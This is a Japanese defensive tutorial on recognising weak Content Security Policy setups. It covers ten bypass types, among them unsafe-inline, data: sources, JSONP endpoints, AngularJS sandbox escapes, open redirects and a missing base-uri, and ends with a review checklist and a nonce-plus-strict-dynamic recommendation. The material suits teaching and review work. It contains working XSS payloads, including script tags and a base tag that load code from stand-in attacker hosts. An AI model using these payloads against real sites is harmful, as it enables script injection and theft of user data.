## CSPの弱い構成を見抜く（bypass技法の理解）

Content Security Policy（CSP）は、ブラウザに対して「どのオリジンから、どの種類のリソース（スクリプト・スタイル・画像・iframe など）を読み込み・実行してよいか」を宣言する防御機構である。HTTPレスポンスヘッダ `Content-Security-Policy`、または `<meta http-equiv="Content-Security-Policy">` で指定する。重要な前提として、**CSPはXSS（クロスサイトスクリプティング）を「起きなくする」ものではなく、「起きても被害の実行を抑える」二次防御層**である。入力検証や出力エスケープの代替にはならない。

本節の目的は防御である。CSPを設計・レビューする立場から「なぜこの構成だと保護が骨抜きになるのか」を、ブラウザのパーサやディレクティブの評価アルゴリズムの挙動レベルで理解し、レビュー時に弱い構成を検出できるようになることを狙う。実在サービスへの無許可検証や攻撃実行は扱わない。すべてのペイロード例は、自分が管理する検証環境で構成の穴を確認するための最小サンプルである。

### CSPが「効く／効かない」を決める仕組み

CSPの中核は **fetch directive（取得ディレクティブ）** 群である。代表格は `script-src`（スクリプトの読み込み元・実行方法を制御）で、`default-src` は個別指定のないディレクティブのフォールバックとして働く。ブラウザはリソースを読み込む直前に、そのリソースの種類に対応するディレクティブの「ソースリスト」を評価し、**マッチするソースが1つでもあれば許可、なければブロック**する。

ここで「見抜く」ための第一原理は次の3点である。

1. **ディレクティブが存在しないと、そのリソース種は `default-src` にフォールバックする。`default-src` すらなければ完全に無制限**になる。つまり「書いていないディレクティブ」は最大の穴になりうる。
2. **ソースリストに1つでも緩いソース（`'unsafe-inline'`、`*`、`data:`、信頼しすぎたドメイン）が混じると、他の厳格なソース指定は意味を失う**。CSPはAND条件ではなくOR条件（いずれかにマッチすれば許可）だからである。
3. **`script-src` が厳格でも、`base-uri` や `object-src` など「スクリプト実行の別経路」を塞いでいないと迂回できる**。

この3点を軸に、以下で類型を見ていく。

### 類型1：`'unsafe-inline'` — インラインスクリプトを丸ごと許可

もっとも典型的な弱い構成。次のようなポリシーを考える。

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*
```

ここに、たとえば属性値へのHTML注入点があれば、次で実行できる。

```html
"/><script>alert(1337);</script>
```

**なぜ通るか**：`'unsafe-inline'` は、`<script>...</script>` のようなインラインスクリプト要素と `onerror=` 等のインラインイベントハンドラの実行を明示的に許可するキーワードである。CSPが本来もっとも防ぎたい「注入されたインラインスクリプト」を、この1語が無効化してしまう。ソースリストに厳格なドメイン列挙があっても、OR条件なので `'unsafe-inline'` にマッチした時点で許可される。レビューでは `script-src` に `'unsafe-inline'`（かつ後述のnonce/hashが無い）を見たら、その時点でスクリプト実行制御は事実上無効とみなす。

### 類型2：`'unsafe-eval'` と `data:` — 文字列からのコード生成

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*
```

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

（base64 `YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==` は `alert(document.domain)`）

**なぜ通るか**：`data:` スキームがソースリストにあると、`data:` URI で表現したスクリプトを外部スクリプトとして読み込めてしまう。`data:` はネットワークを介さず「その場でコンテンツを埋め込む」ため、実質インライン注入と同じ危険性を持つ。加えて `'unsafe-eval'` は `eval()` / `Function()` / `setTimeout("...")` など「文字列をコードとして評価する」APIを解禁する。テンプレートエンジンやライブラリが内部で `eval` 相当を使う場合、`'unsafe-eval'` があるとそこが実行経路になる。**`data:` を `script-src` に入れてはならない**、が実務上の結論。

### 類型3：ワイルドカード `*` / スキームソース

```
Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *
```

```html
"/>'><script src=https://attacker.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

**なぜ通るか**：`*` は任意オリジンからの読み込みを許可する（ただし `data:`/`blob:`/`filesystem:` スキームは `*` には含まれず個別指定が必要、という細かな仕様がある）。`https:` のようなスキームだけのソースも「HTTPSならどこでも可」を意味し、攻撃者管理ドメインを排除できない。ワイルドカードや裸のスキームソースは、事実上ホワイトリストを無意味化する。

### 類型4：`object-src` の欠落 — プラグイン経路

```
Content-Security-Policy: script-src 'self'
```

`script-src` だけを厳格に書き、`object-src` も `default-src` も無いケース。

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**なぜ通るか**：`<object>` / `<embed>` の読み込みは `object-src`（無ければ `default-src`）が支配する。両方欠落していると、`<object>` に `data:text/html` を渡してHTMLごと（＝その中のスクリプトごと）実行できる。だから最小限の堅牢CSPでも `object-src 'none'` は必須とされる。古い環境では Flash（`.swf`）の `allowScriptAccess` を悪用する古典的経路もあり、`ajax.googleapis.com` 上の `charts.swf` を使う実例が知られる（現在はFlash廃止で成立しにくいが、原理として `object-src` 欠落の危険を示す）。

### 類型5：`'self'` とファイルアップロード — 同一オリジンの信頼が仇に

```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

一見堅牢だが、アプリが**同一オリジンにユーザーファイルを保存できる**場合に崩れる。

```html
"/>'><script src="/user_upload/mypic.png.js"></script>
```

**なぜ通るか**：`'self'` は「レスポンスを返したのと同じオリジン」を許可する。攻撃者がスクリプト内容のファイルを自オリジンにアップロードできれば、それは `'self'` にマッチする。多くのサーバは拡張子や `Content-Type` の検証が甘く、`.png.js` や画像の中にJSを潜ませたポリグロットが通る。**`'self'` を許可するなら、アップロード物が同一オリジンから任意 `Content-Type` で配信され得ないか**をセットで確認する必要がある。

> 出典: Content-Security-Policy (CSP) Bypass Techniques — https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md

### 類型6：JSONPエンドポイント — 信頼ドメインが実行装置になる

```
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none'
```

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

**なぜ通るか**：JSONP（JSON with Padding）は、`callback` パラメータで指定した関数名でJSONを包んで返す仕組みで、レスポンスは実行可能なJavaScriptになる。ホワイトリストに載った巨大ドメインには古いJSONPエンドポイントが残っていることがあり、`callback=alert` のように任意の関数呼び出しを差し込める。CSP的にはそのドメインは正規に許可されているため、ブラウザは何も疑わずスクリプトとして実行する。これが「信頼ドメインを列挙するホワイトリスト方式CSP」の構造的弱点で、Googleの CSP Evaluator が特定ドメインを危険と警告する理由でもある。**大手CDN/APIドメインを丸ごと `script-src` に入れると、そこのJSONPが実行経路になる**。

### 類型7：信頼CDN上の脆弱／悪用可能ライブラリ（AngularJS 等）

```
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none'
```

CDNを信頼すると、そのCDNが配る古いライブラリを使ってサンドボックスを破れる。代表がAngularJS（1.x）である。

```html
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

```html
ng-app"ng-csp ng-click=$event.view.alert(1337)>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
```

**なぜ通るか**：AngularJS はHTML内の `{{ }}` 式を自前のサンドボックスで評価する。歴代バージョンでこのサンドボックスの脱出（`$eval.constructor('...')()` のようにコンストラクタ経由でグローバル `Function` に到達する等）が繰り返し発見された。`ng-csp` 属性はAngularを「CSP互換モード」で動かすが、それでも式評価という実行経路自体は残る。CSPは「cdnjs からのスクリプト読み込み」を許可しているだけで、その中身がテンプレート式を実行することまでは制御できない。同様に古い Prototype.js なども悪用対象になる。**バージョン注記**：これはAngularJS 1.x系（2018年にサポート終了、2022年にEOL）の話で、Angular 2+ は別物。だが古いCDNパスは今も配信され続けるため、CDNをホワイトリストする限り現在も有効な迂回になりうる。

### 類型8：オープンリダイレクト連鎖 — ホワイトリスト間のジャンプ

```
Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com
```

```html
">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**なぜ通るか**：CSPのソースマッチは**リダイレクト後の最終URLではなく、初回リクエスト先のURL**で行われる（正確には、リダイレクト先はパス部分のマッチが緩められる仕様がある）。ホワイトリストにパス制限付きで載ったドメインでも、別の許可ドメインのオープンリダイレクトを踏み台にすれば、パス制限を回避してJSONPエンドポイントへ到達できる。**ホワイトリストに載せるドメインは、オープンリダイレクトを持たないことまで確認**しないと連鎖される。

### 類型9：`iframe srcdoc` / `data:` フレーム — 実行文脈のすり替え

```
Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src 'self'
```

```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

**なぜ通るか**：`srcdoc` で作った子フレームや `data:` フレームは、親のCSPの継承関係が構成によって変わる。上記のように `default-src` に `data:` と `*` が入っていると、子文脈でのスクリプト読み込みが緩いソースにマッチしてしまう。フレーム系は `frame-src` / `child-src` と、子文書自身のCSP継承を意識して塞ぐ必要がある。

### 類型10：`base-uri` の欠落 — 相対パスの基準を奪う

これは「見落とされやすい」筆頭。次はスクリプトソースが完璧に見える。

```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

だが `base-uri` が無く、ページが相対パスで `<script src="app.js">` のように読み込んでいて、かつHTML注入点があると：

```html
<base href="https://attacker.example/">
```

**なぜ通るか**：`<base>` タグは、ページ内すべての相対URLの基準オリジンを変える。注入した `<base>` により、本来 `'self'` から読むはずだった `app.js` が攻撃者オリジンから読み込まれる。`script-src 'self'` は「`'self'` から読む」ことを許可しているだけで、`'self'` が指すオリジンが `<base>` で書き換えられる可能性まではケアしない。**対策は `base-uri 'none'`（または `'self'`）を明示すること**。`base-uri` は `default-src` にフォールバックしない独立ディレクティブなので、書かない限り無制限になる点が重要。

> ⚠️ **未取得の資料**: 「Content Security Policy (CSP) Bypass（HackTricks）」は自動取得できませんでした（理由: egress プロキシが `tollbit.hacktricks.wiki` への302リダイレクト先で HTTP 402 Payment Required を返したため）。以下のURLからご自身で直接ご覧ください: https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
>
> （以下は未取得資料の補足として一般知識および代替検索結果に基づく解説です）HackTricks の該当ページは、上記の `base-uri` 迂回・JSONP・信頼ドメイン悪用に加えて、次の観点を整理している。**nonce の弱点**：`script-src 'nonce-xxxx'` は毎回のレスポンスで暗号学的に十分ランダムな値を生成することが前提。nonceを複数レスポンスで**使い回す**、静的固定にする、弱い乱数で生成すると、値を推測・再利用してnonce付きスクリプトを注入できる。**`strict-dynamic`**：`script-src 'nonce-rAnd0m' 'strict-dynamic'` は、nonce（またはhash）で許可された「信頼スクリプト」が動的に生成した子スクリプトへ信頼を伝播させ、代わりにホスト名ホワイトリストや `'self'` を無視する。これによりJSONP/信頼CDN型の迂回を封じられる一方、信頼スクリプト自体が `document.createElement('script')` で任意srcを注入できる作りだと、そこが新たな経路になる。**dangling markup injection**：スクリプトを実行できなくても、閉じられていない `<img src='https://attacker/?` のような断片を注入し、後続のHTML（CSRFトークンやnonce）をクエリ文字列として攻撃者サーバへ送出させ情報を漏らす手法。`connect-src`/`img-src` が緩いと成立する。**PHP_SELF / RPO（Relative Path Overwrite）**：`$_SERVER['PHP_SELF']` をそのままページURLに反映するアプリで、パス操作により相対パス基準をずらし、キャッシュされた別リソースをスクリプトとして読ませる古典技法。いずれも「`script-src` だけ堅くしても、周辺ディレクティブ（`base-uri`/`connect-src`/`img-src`）とアプリ実装の穴で漏れる」という一貫した教訓を示す。
>
> 出典: Content Security Policy (CSP) Bypass — HackTricks（未取得） https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html ／ 補足検索: CSP and Bypasses — https://www.cobalt.io/blog/csp-and-bypasses ／ CSP Bypasses: Advanced Exploitation Guide — https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses

### レビュー観点のまとめ：弱い構成のチェックリスト

防御側が構成をレビューするときの優先順位を、危険度順に整理する。

| 見つけたら要注意 | なぜ危険か | 望ましい対処 |
|---|---|---|
| `script-src` に `'unsafe-inline'`（nonce/hash併用なし） | 注入インラインが即実行 | nonce または hash に置換 |
| `script-src` に `'unsafe-eval'` | 文字列→コード評価が解禁 | 削除し、evalを使わない実装へ |
| `*` / `https:` / `data:` を `script-src` に含む | ホワイトリストが無意味化 | 具体オリジン限定、`data:`除去 |
| `object-src` と `default-src` の両方欠落 | `<object>` 経由でHTML/スクリプト実行 | `object-src 'none'` 明示 |
| `base-uri` 未指定 | `<base>` で相対パス基準を奪取 | `base-uri 'none'` 明示 |
| 大手CDN/APIドメインを丸ごと許可 | JSONP・古いライブラリで迂回 | 必要パスに限定、`strict-dynamic`検討 |
| `'self'` 許可＋任意ファイルアップロード可 | 自オリジンからJS配信 | アップロード物の配信オリジン分離 |
| nonce の使い回し・固定・弱乱数 | nonce再利用で注入 | レスポンス毎に強乱数で再生成 |

**現代的なベストプラクティス（2024〜2025年時点の推奨）**は、ホスト名ホワイトリスト方式をやめ、nonce ベース＋ `strict-dynamic` に寄せる構成である。

```
Content-Security-Policy: script-src 'nonce-{ランダム}' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

**なぜ強いか**：`'strict-dynamic'` があるとホスト名ソースと `'self'` は無視されるため、JSONP・信頼CDN・アップロード迂回（類型5〜9）がまとめて封じられる。残る攻撃面は「nonce の生成品質」と「信頼スクリプトが安全に子スクリプトを生成しているか」に絞られ、レビューが局所化できる。`object-src 'none'` と `base-uri 'none'` を必ず添えることで、類型4・10も同時に塞ぐ。

最後に、CSPは**多層防御の一枚**であることを再確認したい。上記のどの類型も、根本原因はHTML/属性への注入点そのものであり、CSPはそれが起きた後の実行を止める設計になっている。したがってレビューでは「CSPの穴」と「注入点の有無」を両輪で見る。CSPが完璧でも注入点があれば dangling markup で情報が漏れうるし、注入点が無ければ弱いCSPでも直ちに被害には至らない。構成の弱さを見抜く目的は、**万一の注入時に最後の一線が機能するかを保証すること**にある。

> 出典: Content-Security-Policy (CSP) Bypass Techniques — https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md
